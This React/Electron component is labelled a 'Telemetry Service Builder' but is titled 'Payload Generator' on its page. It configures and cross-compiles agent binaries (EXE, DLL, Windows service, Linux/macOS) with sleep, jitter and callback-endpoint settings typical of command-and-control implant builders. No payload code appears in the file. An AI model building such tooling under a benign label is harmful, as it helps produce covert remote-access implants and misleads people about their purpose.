/**
 * Telemetry Service Builder
 * Build and configure telemetry monitoring services
 * Supports cross-platform compilation via Go
 */

import React, { useState, useEffect } from 'react';
import '../styles/ServiceBuilder.css';
import { getServerUrl } from '../utils/config';

// Output formats per platform
const OUTPUT_FORMATS = {
  windows: [
    { id: 'exe', label: 'EXE', desc: 'Standalone executable', ext: '.exe' },
    { id: 'dll', label: 'DLL', desc: 'Dynamic link library', ext: '.dll' },
    { id: 'svc', label: 'SVC', desc: 'Windows Service', ext: '.exe' }
  ],
  darwin: [
    { id: 'bin', label: 'BIN', desc: 'Standalone binary', ext: '' }
  ],
  linux: [
    { id: 'bin', label: 'BIN', desc: 'Standalone binary', ext: '' }
  ]
};

const ServiceBuilder = () => {
  const [status, setStatus] = useState('');
  const [processing, setProcessing] = useState(false);
  const [buildOutput, setBuildOutput] = useState('');
  const [goAvailable, setGoAvailable] = useState(false);
  const [platforms, setPlatforms] = useState([]);
  const [selectedPlatform, setSelectedPlatform] = useState('');
  const [selectedFormat, setSelectedFormat] = useState('exe');

  // Configuration
  const [config, setConfig] = useState({
    collectorEndpoint: getServerUrl(),
    serviceName: 'system-telemetry-service',
    authSecret: '',
    sleepInterval: 3,
    jitterPercent: 20,
    selfPort: 5050
  });

  // Get platform info on mount
  useEffect(() => {
    const initialize = async () => {
      if (window.electronAPI) {
        // Check Go silently
        if (window.electronAPI.checkGo) {
          const goResult = await window.electronAPI.checkGo();
          setGoAvailable(goResult.available);
        }

        // Get platforms
        if (window.electronAPI.getPlatformInfo) {
          const platformInfo = await window.electronAPI.getPlatformInfo();
          setPlatforms(platformInfo.platforms);
          setSelectedPlatform(platformInfo.currentPlatform);
          // Set default format based on platform
          const os = platformInfo.currentPlatform.split('-')[0];
          setSelectedFormat(os === 'windows' ? 'exe' : 'bin');
        }
      }
    };
    initialize();
  }, []);

  // Update format when platform changes
  useEffect(() => {
    if (selectedPlatform) {
      const os = selectedPlatform.split('-')[0];
      const formats = OUTPUT_FORMATS[os] || OUTPUT_FORMATS.linux;
      // Reset to first format if current format not available for new platform
      if (!formats.find(f => f.id === selectedFormat)) {
        setSelectedFormat(formats[0].id);
      }
    }
  }, [selectedPlatform]);

  const getCurrentOS = () => {
    if (!selectedPlatform) return 'linux';
    return selectedPlatform.split('-')[0];
  };

  const getFormatsForPlatform = () => {
    return OUTPUT_FORMATS[getCurrentOS()] || OUTPUT_FORMATS.linux;
  };

  const handleDownload = async () => {
    if (!goAvailable) {
      setStatus('Go compiler not available');
      return;
    }

    setProcessing(true);
    setStatus('Downloading');
    setBuildOutput('');

    try {
      // Step 1: Build the service
      const buildResult = await window.electronAPI.buildServiceGo({
        ...config,
        targetPlatform: selectedPlatform,
        outputFormat: selectedFormat
      });

      if (!buildResult.success) {
        setStatus('Failed');
        setBuildOutput(buildResult.output || buildResult.error);
        setProcessing(false);
        return;
      }

      // Step 2: Get compiled file
      const fileResult = await window.electronAPI.getCompiledFile({});

      if (!fileResult.success) {
        setStatus(`Failed: ${fileResult.error}`);
        setProcessing(false);
        return;
      }

      // Step 3: Save dialog
      const saveResult = await window.electronAPI.saveFile({
        fileName: fileResult.fileName,
        fileData: fileResult.fileData
      });

      if (saveResult.success) {
        setStatus(`Saved: ${saveResult.filePath}`);
        setBuildOutput('');
      } else if (saveResult.canceled) {
        setStatus('Download cancelled');
      } else {
        setStatus(`Save failed: ${saveResult.error}`);
      }
    } catch (error) {
      setStatus(`Error: ${error.message}`);
    } finally {
      setProcessing(false);
    }
  };

  const getSelectedPlatformLabel = () => {
    const platform = platforms.find(p => p.id === selectedPlatform);
    return platform ? platform.label : selectedPlatform;
  };

  const getSelectedFormatInfo = () => {
    const formats = getFormatsForPlatform();
    return formats.find(f => f.id === selectedFormat) || formats[0];
  };

  const getConfigSummary = () => {
    const sleepMs = config.sleepInterval * 1000;
    const jitterMs = Math.round(sleepMs * (config.jitterPercent / 100));
    return `Sleep: ${sleepMs}ms ± ${jitterMs}ms jitter`;
  };

  return (
    <div className="service-builder">
      <div className="page-header">
        <h1 className="page-title">
          <span className="title-icon">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/>
              <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/>
              <polyline points="3.27 6.96 12 12.01 20.73 6.96"/>
              <line x1="12" y1="22.08" x2="12" y2="12"/>
            </svg>
          </span>
          Payload Generator
        </h1>
      </div>

      <div className="generator-content">
        {/* Configuration Section */}
        <div className="config-section">
          <h2>Service Configuration</h2>

          <div className="config-grid">
            <div className="config-item">
              <label>Collector Endpoint</label>
              <input
                type="text"
                value={config.collectorEndpoint}
                onChange={(e) => setConfig({...config, collectorEndpoint: e.target.value})}
                placeholder="http://localhost:4318"
              />
            </div>

            <div className="config-item">
              <label>Service Name</label>
              <input
                type="text"
                value={config.serviceName}
                onChange={(e) => setConfig({...config, serviceName: e.target.value})}
                placeholder="system-telemetry-service"
              />
            </div>

            <div className="config-item">
              <label>API Key</label>
              <input
                type="password"
                value={config.authSecret}
                onChange={(e) => setConfig({...config, authSecret: e.target.value})}
                placeholder="Enter API key"
              />
            </div>

            <div className="config-item">
              <label>Poll Interval (seconds)</label>
              <input
                type="number"
                value={config.sleepInterval}
                onChange={(e) => setConfig({...config, sleepInterval: parseInt(e.target.value) || 3})}
                min="1"
                max="300"
              />
            </div>

            <div className="config-item">
              <label>Jitter (%)</label>
              <input
                type="number"
                value={config.jitterPercent}
                onChange={(e) => setConfig({...config, jitterPercent: parseInt(e.target.value) || 20})}
                min="0"
                max="50"
              />
            </div>
          </div>

          <div className="config-summary">
            <span className="summary-label">Timing:</span>
            <span className="summary-value">{getConfigSummary()}</span>
          </div>
        </div>

        {/* Platform Selection */}
        <div className="platform-section">
          <h2>Target Platform</h2>
          <p className="platform-info">
            SELECT THE TARGET PLATFORM FOR THE AGENT
          </p>

          <div className="platform-grid">
            {platforms.map(platform => (
              <button
                key={platform.id}
                className={`platform-btn ${selectedPlatform === platform.id ? 'selected' : ''}`}
                onClick={() => setSelectedPlatform(platform.id)}
              >
                <span className="platform-os">{platform.os === 'windows' ? 'WIN' : platform.os === 'darwin' ? 'MAC' : 'LNX'}</span>
                <span className="platform-label">{platform.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Output Format Selection */}
        <div className="format-section">
          <h2>Output Format</h2>
          <p className="format-info">
            SELECT THE OUTPUT FORMAT FOR {getSelectedPlatformLabel().toUpperCase()}
          </p>

          <div className="format-grid">
            {getFormatsForPlatform().map(format => (
              <button
                key={format.id}
                className={`format-btn ${selectedFormat === format.id ? 'selected' : ''}`}
                onClick={() => setSelectedFormat(format.id)}
              >
                <span className="format-label">{format.label}</span>
                <span className="format-desc">{format.desc}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Download Section */}
        <div className="download-section">
          <h2>Download</h2>

          <div className="download-buttons">
            <button
              className="btn btn-download"
              onClick={handleDownload}
              disabled={processing || !goAvailable}
            >
              {processing ? (
                <>
                  <span className="spinner"></span>
                  Downloading
                </>
              ) : (
                <>
                  <span className="download-icon">{getSelectedFormatInfo().label}</span>
                  <span className="download-text">
                    <span className="download-name">
                      Download {getSelectedFormatInfo().label}
                    </span>
                    <span className="download-desc">
                      {getSelectedFormatInfo().desc}
                    </span>
                  </span>
                </>
              )}
            </button>
          </div>

          {status && !processing && (
            <div className={`build-status ${status.includes('Saved') ? 'success' : status.includes('failed') || status.includes('Error') || status.includes('Failed') ? 'error' : ''}`}>
              {status}
            </div>
          )}

          {buildOutput && (
            <div className="build-output">
              <pre>{buildOutput}</pre>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ServiceBuilder;
